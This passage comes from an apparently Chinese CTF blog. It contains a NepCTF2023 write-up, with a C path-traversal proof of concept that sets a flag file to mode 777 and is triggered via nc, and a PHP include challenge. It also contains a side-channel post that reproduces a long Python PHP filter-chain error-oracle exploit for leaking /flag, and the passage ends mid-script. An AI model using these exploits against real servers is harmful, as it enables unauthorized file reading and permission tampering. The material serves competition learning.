class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* filename = <span class="hljs-string">&quot;../../../../flag_mini&quot;</span>;<br>    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">openat</span>(<span class="hljs-number">3</span>, filename, O_CREAT | O_WRONLY);<br>    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-comment">// 处理打开文件失败的情况</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 更改文件权限为 777</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fchmod</span>(fd, S_IRWXU | S_IRWXG | S_IRWXO) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-comment">// 处理更改文件权限失败的情况</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 使用新文件进行操作...</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> I2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRpby5oPgoKaW50IG1haW4oKSB7CiAgICBjb25zdCBjaGFyKiBmaWxlbmFtZSA9ICIuLi8uLi8uLi8uLi9mbGFnX21pbmkiOwogICAgaW50IGZkID0gb3BlbmF0KDMsIGZpbGVuYW1lLCBPX0NSRUFUIHwgT19XUk9OTFkpOwogICAgaWYgKGZkID09IC0xKSB7CiAgICAgICAgLy8g5aSE55CG5omT5byA5paH5Lu25aSx6LSl55qE5oOF5Ya1CiAgICAgICAgcHJpbnRmKCIxIik7CiAgICB9CgogICAgLy8g5pu05pS55paH5Lu25p2D6ZmQ5Li6IDc3NwogICAgaWYgKGZjaG1vZChmZCwgU19JUldYVSB8IFNfSVJXWEcgfCBTX0lSV1hPKSA9PSAtMSkgewogICAgICAgIC8vIOWkhOeQhuabtOaUueaWh+S7tuadg+mZkOWksei0peeahOaDheWGtQogICAgICAgIHByaW50ZigiMiIpOwogICAgfQoKICAgIC8vIOS9v+eUqOaWsOaWh+S7tui/m+ihjOaTjeS9nC4uLgoKICAgIHJldHVybiAwOwp9|<span class="hljs-built_in">base64</span> -d &gt; poc.c<br></code></pre></td></tr></table></figure><p>注意，由于ctf用户运行是在沙盒里，我们也需要切换过去</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/home/</span>ctf<span class="hljs-regexp">/sandbox/</span>d41d8cd98f00b204e9800998ecf8427e<br>gcc poc.c -o poc<br></code></pre></td></tr></table></figure><p><img src="/2023/08/31/NepCTF2023/web4.png" alt="image.png"></p><p>eth0网卡是172.17.0.19，源码中说了，会判断我们的nc是否和eth0对应的ip一样</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">172.17.0.19</span> <span class="hljs-number">9999</span><br><span class="hljs-attribute">Tmp</span>-Command:./poc<br></code></pre></td></tr></table></figure><p><img src="/2023/08/31/NepCTF2023/web5.png"></p><p>成功修改权限</p><h3 id="Ez-include"><a href="#Ez-include" class="headerlink" title="Ez_include"></a>Ez_include</h3><p>操作一下参数得到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$jump_link</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;link&#x27;</span>];<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$jump_link</span>)) &#123;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$jump_link</span>. <span class="hljs-string">&quot;.txt&quot;</span>); <span class="hljs-comment">// More info? See &quot;/var/www/html/hint.ini&quot; or &quot;./hint.ini&quot;</span><br>    <br>&#125;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hint&#x27;</span>])) &#123;<br>    <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hint&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$jump_link</span>)) &#123;<br><span class="hljs-meta">?&gt;</span><br>所以到底来没来? 且看 /<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-keyword">__FILE__</span>)<span class="hljs-meta">?&gt;</span>?hint<br><span class="hljs-meta">&lt;?php</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Boogipop大佬说一眼看出<code>filterchain</code>，虽然我在比赛前不久学过filterchain，但根本不知道这里为什么要使用</p><p>这里filterchain的问题是<code>/tmp/resources/2.txt</code>的内容为中文</p><p>要先对其进行<code>base64-encode</code>然后再进行<code>filterchain</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>从lovephp看侧信道</title>
    <link href="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/"/>
    <url>/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/</url>
    
    <content type="html"><![CDATA[<h1 id="侧信道"><a href="#侧信道" class="headerlink" title="侧信道"></a>侧信道</h1><h2 id="什么是侧信道"><a href="#什么是侧信道" class="headerlink" title="什么是侧信道"></a>什么是侧信道</h2><p>个人简单理解就是通过报错，响应时间等信息推断出敏感信息，因此经常通过<strong>盲注</strong>的方式进行攻击</p><p>Boogipop大佬的说法：</p><p>都说侧信道，那什么是侧信道。侧信道其实就是根据一个二元或者多元条件关系差，可以让我们以”盲注”的形式，去获取某些信息的一种方法，测信道广义上是非常广泛的。在web题目中他们通常以盲注的形式出现</p><blockquote><p>盲注攻击在广义上可以被认为是一种侧信道攻击，因为它是利用应用程序的实现细节（如响应时间、错误信息等）推断出敏感信息的一种攻击方式。与其他侧信道攻击不同的是，盲注攻击通常是针对Web应用程序或其他应用程序进行的，而不是直接攻击物理设备或加密算法。<br>在盲注攻击中，攻击者通常无法直接获取目标系统中的敏感信息，而是通过不断地尝试发送恶意数据，并根据应用程序的响应结果进行推断。例如，攻击者可以通过不断地发送不同的请求，根据目标系统返回的响应时间、错误信息等推断出敏感信息，进而实现攻击的目的</p></blockquote><h2 id="DownUnderCTF2022-minimal-php"><a href="#DownUnderCTF2022-minimal-php" class="headerlink" title="[DownUnderCTF2022] minimal-php"></a>[DownUnderCTF2022] minimal-php</h2><p>题目只有一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>Boogipop大佬说够存一辈子的脚本，嘿嘿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">THE GRAND IDEA:</span><br><span class="hljs-string">We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE</span><br><span class="hljs-string">filter will blow up the string length by 4x every time it is used, which will quickly cause</span><br><span class="hljs-string">500 error if and only if the string is non empty. So we now have an oracle that tells us if</span><br><span class="hljs-string">the string is empty.</span><br><span class="hljs-string"></span><br><span class="hljs-string">THE GRAND IDEA 2:</span><br><span class="hljs-string">The dechunk filter is interesting.</span><br><span class="hljs-string">https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724</span><br><span class="hljs-string">It looks like it was implemented for something http related, but for our purposes, the interesting</span><br><span class="hljs-string">behavior is that if the string contains no newlines, it will wipe the entire string if and only if</span><br><span class="hljs-string">the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our</span><br><span class="hljs-string">above oracle! In fact we can verify that since the flag starts with D that the filter chain</span><br><span class="hljs-string"></span><br><span class="hljs-string">dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE</span><br><span class="hljs-string"></span><br><span class="hljs-string">does not cause a 500 error.</span><br><span class="hljs-string"></span><br><span class="hljs-string">THE REST:</span><br><span class="hljs-string">So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent</span><br><span class="hljs-string">into madness trying to figure out ways to:</span><br><span class="hljs-string">- somehow get other characters not at the start of the flag file to the front</span><br><span class="hljs-string">- detect more precisely which character is at the front</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">join</span>(<span class="hljs-params">*x</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;|&#x27;</span>.join(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">err</span>(<span class="hljs-params">s</span>):<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-keyword">raise</span> ValueError<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">req</span>(<span class="hljs-params">s</span>):<br>data = &#123;<br><span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">f&#x27;php://filter/<span class="hljs-subst">&#123;s&#125;</span>/resource=/flag&#x27;</span><br>&#125;<br><span class="hljs-keyword">return</span> requests.post(<span class="hljs-string">&#x27;http://localhost:5000/index.php&#x27;</span>, data=data).status_code == <span class="hljs-number">500</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step 1:</span><br><span class="hljs-string">The second step of our exploit only works under two conditions:</span><br><span class="hljs-string">- String only contains a-zA-Z0-9</span><br><span class="hljs-string">- String ends with two equals signs</span><br><span class="hljs-string"></span><br><span class="hljs-string">base64-encoding the flag file twice takes care of the first condition.</span><br><span class="hljs-string"></span><br><span class="hljs-string">We don&#x27;t know the length of the flag file, so we can&#x27;t be sure that it will end with two equals</span><br><span class="hljs-string">signs.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Repeated application of the convert.quoted-printable-encode will only consume additional</span><br><span class="hljs-string">memory if the base64 ends with equals signs, so that&#x27;s what we are going to use as an oracle here.</span><br><span class="hljs-string">If the double-base64 does not end with two equals signs, we will add junk data to the start of the</span><br><span class="hljs-string">flag with convert.iconv..CSISO2022KR until it does.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>blow_up_enc = join(*[<span class="hljs-string">&#x27;convert.quoted-printable-encode&#x27;</span>]*<span class="hljs-number">1000</span>)<br>blow_up_utf32 = <span class="hljs-string">&#x27;convert.iconv.L1.UCS-4LE&#x27;</span><br>blow_up_inf = join(*[blow_up_utf32]*<span class="hljs-number">50</span>)<br><br>header = <span class="hljs-string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span><br><br><span class="hljs-comment"># Start get baseline blowup</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calculating blowup&#x27;</span>)<br>baseline_blowup = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>payload = join(*[blow_up_utf32]*n)<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>):<br>baseline_blowup = n<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;baseline blowup is <span class="hljs-subst">&#123;baseline_blowup&#125;</span>&#x27;</span>)<br><br>trailer = join(*[blow_up_utf32]*(baseline_blowup-<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">assert</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>) == <span class="hljs-literal">False</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;detecting equals&#x27;</span>)<br>j = [<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>),<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>),<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>)<br>]<br><span class="hljs-built_in">print</span>(j)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(j) != <span class="hljs-number">2</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-keyword">if</span> j[<span class="hljs-number">0</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span><br><span class="hljs-keyword">elif</span> j[<span class="hljs-number">1</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#x27;</span><br><span class="hljs-keyword">elif</span> j[<span class="hljs-number">2</span>] == <span class="hljs-literal">False</span>:<br>header = <span class="hljs-string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;j: <span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;header: <span class="hljs-subst">&#123;header&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step two:</span><br><span class="hljs-string">Now we have something of the form</span><br><span class="hljs-string">[a-zA-Z0-9 things]==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span><br><span class="hljs-string">successive characters from the start of the string to access every character. Maybe something like</span><br><span class="hljs-string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span><br><span class="hljs-string">there are filters that *swap* characters:</span><br><span class="hljs-string"></span><br><span class="hljs-string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span><br><span class="hljs-string">abcdefgh -&gt; badcfehg</span><br><span class="hljs-string"></span><br><span class="hljs-string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span><br><span class="hljs-string">abcdefgh -&gt; dcbahgfe</span><br><span class="hljs-string"></span><br><span class="hljs-string">This allows us to access the first four characters of the string. Can we do better? It turns out</span><br><span class="hljs-string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of</span><br><span class="hljs-string">the string:</span><br><span class="hljs-string"></span><br><span class="hljs-string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span><br><span class="hljs-string"></span><br><span class="hljs-string">The idea being that if we now use the r4 gadget, we get something like:</span><br><span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span><br><span class="hljs-string"></span><br><span class="hljs-string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span><br><span class="hljs-string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span><br><span class="hljs-string">bafedc</span><br><span class="hljs-string"></span><br><span class="hljs-string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th</span><br><span class="hljs-string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span><br><span class="hljs-string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span><br><span class="hljs-string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no</span><br><span class="hljs-string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it</span><br><span class="hljs-string">turns out, if we apply the filter</span><br><span class="hljs-string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span><br><span class="hljs-string"></span><br><span class="hljs-string">It will turn the == into:</span><br><span class="hljs-string">+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">And this is magic, because this corrects such that when we apply the</span><br><span class="hljs-string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Let&#x27;s recap. We have a string like:</span><br><span class="hljs-string">abcdefghij==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span><br><span class="hljs-string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span><br><span class="hljs-string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply r4 gadget:</span><br><span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span><br><span class="hljs-string"></span><br><span class="hljs-string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span><br><span class="hljs-string">bafedcjihg+0DAD3D3+0DAD3Dw==</span><br><span class="hljs-string"></span><br><span class="hljs-string">Then apply r4 once more:</span><br><span class="hljs-string">efabijcd0+gh3DAD0+3D3DAD==wD</span><br><span class="hljs-string"></span><br><span class="hljs-string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span><br><span class="hljs-string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span><br><span class="hljs-string">want, to access all the characters in the string ;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>flip = <span class="hljs-string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span><br>r2 = <span class="hljs-string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span><br>r4 = <span class="hljs-string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_nth</span>(<span class="hljs-params">n</span>):<br><span class="hljs-keyword">global</span> flip, r2, r4<br>o = []<br>chunk = n // <span 